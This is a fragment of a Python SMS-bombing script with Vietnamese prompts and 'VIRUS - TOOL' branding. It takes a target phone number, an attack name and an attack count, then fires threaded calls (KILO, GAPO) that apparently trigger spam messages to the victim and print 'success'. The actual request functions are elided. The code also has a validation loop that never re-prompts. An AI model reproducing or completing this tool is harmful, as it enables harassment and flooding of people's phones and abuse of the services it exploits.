...
print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
sdt = input("\033[32m[ + ] Phone NumBer : ")
print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
print("\033[32mCheck Phone: Đang Check Số Điện Thoại Chuẩn Bị Tấn Công !!")
time.sleep(5)
print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print("\033[31mSố Điện Thoại Phải Đủ 10 Số !!")
print("\033[32m➤ Lưu Ý Khi Nhập Tên Tấn Công Không Được Phép Nhập Tên Chứa Số Và Nhập Tối Đa 12 Chữ !!")
print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
user_input = input("\033[32m[ + ] Enter Name Attack: ")
limited_input = user_input[:12]
print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
while not validate_input(user_input):
  sdt = input("\033[32m[ + ] Phone NumBer : ")
  print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
  print("\033[32m➤ Check Phone: Đang Check Số Điện Thoại Chuẩn Bị Tấn Công !!")
  time.sleep(5)
  print("\033[37m────────────────────────────────────────────────────────────\033[0m")
  print("\033[32m➤ Lưu Ý Khi Nhập Tên Tấn Công Không Được Phép Nhập Tên Chứa Số Và Nhập Dưới 12 Chữ !!")
  print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
  user_input = input("\033[32m[ + ] Enter Name Attack : ")
  limited_input = user_input[:12]
  print("\033[37m───────────────────────────────────────────────────────────────────────────────────────\033[0m")
count = int(input("\033[32m[ + ] Attack Time : "))
print("\033[37m────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\033[0m")
print("\033[34m                                         ⊂🚀⊃MENU START ATTACK PHONE NUMBER \033[32m ➤ "+sdt+"\033[34m⊂🚀⊃\033[0m")
print("\033[37m────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\033[0m")
if sdt == "0123456789":
  print("\033[31m Số Điện Thoại Không Tồn Tại")
  exit()
...
def run(sdt,i):                  
  ...
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt) 
  print("\033[34m[ VIRUS - TOOL ] \033[32m⊂🚀⊃ĐANG GỬI TẤN CÔNG ĐẾN⊂🚀⊃ \033[1;37m| \033[35m➤ USER NAME ATTACK \033[1;37m| \033[1;37m| \033[32mDELAY:\033[1;37m|\033[32m GỬI TẤN CÔNG ĐẾN \033[37m| \033[33mKẾT QUẢ ATTACK SPAM\033[37m")  
  print("\033[34m[ VIRUS - TOOL ]        \033[1;37m|\033[33m "+sdt+" \033[1;37m| \033[33m          ➤ "+user_input+" \033[33m          5 \033[1;37m    | \033[33m"+sdt+" \033[37m|\033[32m         THÀNH CÔNG")
  print("\033[37m────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\033[0m")
  for j in range(0, 5):
    # code trong vòng lặp
    print(f"\033[32m VIRUS - TOOL\033[1;37m |\033[34m RA OFFICIAL VIRUS \r",end="")
